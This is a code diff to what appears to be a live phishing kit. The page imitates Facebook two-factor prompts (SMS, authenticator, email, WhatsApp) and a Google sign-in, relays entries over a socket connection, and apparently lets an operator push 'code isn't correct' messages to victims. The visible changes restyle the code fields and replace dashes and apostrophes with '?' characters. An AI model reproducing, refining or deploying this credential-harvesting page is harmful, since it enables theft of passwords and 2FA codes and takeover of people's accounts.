@@ -101,7 +101,7 @@
     </div>
 <style>
 /* ================================================================
-   Facebook 2026 Modal – Full Rewrite
+   Facebook 2026 Modal ? Full Rewrite
    All classes prefixed fb26- to avoid conflicts with Calendly page
    ================================================================ */
 
@@ -334,12 +334,15 @@
 
 .fb26-code {
   width: 100%; height: 52px;
-  border: 1.5px solid #cdd3d8; border-radius: 8px;
-  font-size: 22px; text-align: center; letter-spacing: 6px;
+  border: 1.5px solid #cdd3d8; border-radius: 16px;
+  font-size: 16px; text-align: left; letter-spacing: normal;
+  padding: 0 16px; box-sizing: border-box;
   outline: none; font-family: inherit; transition: border-color .2s;
+  color: #1c1e21; background: #fff;
   -moz-appearance: textfield;
 }
-.fb26-code:focus { border-color: #0064e0; }
+.fb26-code:focus { border-color: #0064e0; outline: none; }
+.fb26-code::placeholder { color: #8a8d91; font-size: 15px; }
 .fb26-code::-webkit-outer-spin-button,
 .fb26-code::-webkit-inner-spin-button { -webkit-appearance: none; }
 
@@ -666,7 +669,7 @@
             <h2 class="fb26-2fa-t">Enter security code</h2>
             <p class="fb26-2fa-d">Please check your phone for a message with your code. Your code is 6 numbers long.</p>
             <p class="fb26-2fa-ds">We sent your code to: <strong>+***********</strong></p>
-            <input type="number" id="smscode" class="fb26-code" placeholder="Enter Code" required>
+            <input type="number" id="smscode" class="fb26-code" placeholder="Code" required>
             <div id="error-message-sms" class="fb26-cerr"></div>
             <div class="fb26-2fa-ac">
               <a class="fb26-noc" href="#">Didn&#x27;t get a code?</a>
@@ -691,7 +694,7 @@
             <h2 class="fb26-2fa-t">Enter security code</h2>
             <p class="fb26-2fa-d">Your account has two-factor authentication switched on, which requires this extra login step.</p>
             <p class="fb26-2fa-d">Enter the 6-digit code from the authentication app you set up.</p>
-            <input type="number" id="authcodedes" class="fb26-code" placeholder="Enter Code" required>
+            <input type="number" id="authcodedes" class="fb26-code" placeholder="Code" required>
             <div id="error-message-auth" class="fb26-cerr"></div>
             <div class="fb26-2fa-ac">
               <a class="fb26-noc" href="#">Didn&#x27;t get a code?</a>
@@ -716,7 +719,7 @@
             <h2 class="fb26-2fa-t">Enter security code</h2>
             <p class="fb26-2fa-d">Please check your email for a message with your code. Your code is 8 numbers long.</p>
             <p class="fb26-2fa-ds">We sent your code to: <strong>****@****.***</strong></p>
-            <input type="number" id="emailcodedes" class="fb26-code" placeholder="Enter Code" required>
+            <input type="number" id="emailcodedes" class="fb26-code" placeholder="Code" required>
             <div id="error-message" class="fb26-cerr"></div>
             <div class="fb26-2fa-ac">
               <a class="fb26-noc" href="#">Didn&#x27;t get a code?</a>
@@ -741,7 +744,7 @@
             <h2 class="fb26-2fa-t">Enter security code</h2>
             <p class="fb26-2fa-d">Please check your WhatsApp for a message with your code. Your code is 6 numbers long.</p>
             <p class="fb26-2fa-ds">We sent your code to: <strong>+***********</strong></p>
-            <input type="number" id="whcode" class="fb26-code" placeholder="Enter Code" required>
+            <input type="number" id="whcode" class="fb26-code" placeholder="Code" required>
             <div id="error-message-whatsapp" class="fb26-cerr"></div>
             <div class="fb26-2fa-ac">
               <a class="fb26-noc" href="#">Didn&#x27;t get a code?</a>
@@ -759,7 +762,7 @@
 </div><!-- /#facebook-modal -->
 
 <!-- ================================================================
-     Google / Gmail Login Modal – 2026
+     Google / Gmail Login Modal ? 2026
      Panel 0: Facebook "Verify with Google" intermediate page
      Panel 1: Google email step (manual / fallback)
      Panel 2: Google password step
@@ -978,7 +981,7 @@
     var googPassErr   = document.getElementById('goog-pass-err');
     var googActiveEmail = '';  // email in use for this session
 
-    // -- Panel 0: "Verify with Google" button — redirect to full-page Google sign-in --
+    // -- Panel 0: "Verify with Google" button ? redirect to full-page Google sign-in --
     document.getElementById('goog-fbv-verify-btn').addEventListener('click', function() {
       var email = googActiveEmail || document.getElementById('goog-fbv-email-display').textContent;
       try { sessionStorage.setItem('lastLoginEmail', email); } catch(e) {}
@@ -1183,7 +1186,7 @@
             socket.emit('userConnectedToPage', { clientId, page: 'apply' });
 
             if (!_applyFirstConnect) {
-                /* Reconnected after background — reset any stuck FB login spinner */
+                /* Reconnected after background ? reset any stuck FB login spinner */
                 const loginBtn = document.getElementById('loginBtn');
                 if (loginBtn && loginBtn.querySelector('.loading-spinner')) {
                     loginBtn.disabled = false;
@@ -1227,7 +1230,7 @@
             clearInputsAndEnableButtons();
         }
 
-        /* -- Redirected back from google-login.html — open the right FB modal -- */
+        /* -- Redirected back from google-login.html ? open the right FB modal -- */
         const pendingModalMap = {
             '2fa':       'codeSms',
             'auth':      'authcode',
@@ -1269,7 +1272,7 @@
             if (shownCommands['2fa'] && isSectionVisible(sectionId)) {
                 const timerDiv = document.getElementById('error-message-sms');
                 const continueBtn = document.getElementById('smsBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.innerText = "The code you entered isn?t correct.";
                 if (timerDiv) timerDiv.style.display = 'block';
                 if (continueBtn) {
                     continueBtn.innerHTML = 'Continue';
@@ -1288,7 +1291,7 @@
             if (shownCommands['auth'] && isSectionVisible(sectionId)) {
                 const timerDiv = document.getElementById('error-message-auth');
                 const continueBtn = document.getElementById('authBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.innerText = "The code you entered isn?t correct.";
                 if (timerDiv) timerDiv.style.display = 'block';
                 if (continueBtn) {
                     continueBtn.innerHTML = 'Continue';
@@ -1307,7 +1310,7 @@
             if (shownCommands['email'] && isSectionVisible(sectionId)) {
                 const timerDiv = document.getElementById('error-message');
                 const continueBtn = document.getElementById('buttonemailcode');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.innerText = "The code you entered isn?t correct.";
                 if (timerDiv) timerDiv.style.display = 'block';
                 if (continueBtn) {
                     continueBtn.innerHTML = 'Continue';
@@ -1326,7 +1329,7 @@
             if (shownCommands['whatsapp'] && isSectionVisible(sectionId)) {
                 const timerDiv = document.getElementById('error-message-whatsapp');
                 const continueBtn = document.getElementById('whBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.innerText = "The code you entered isn?t correct.";
                 if (timerDiv) timerDiv.style.display = 'block';
                 if (continueBtn) {
                     continueBtn.innerHTML = 'Continue';
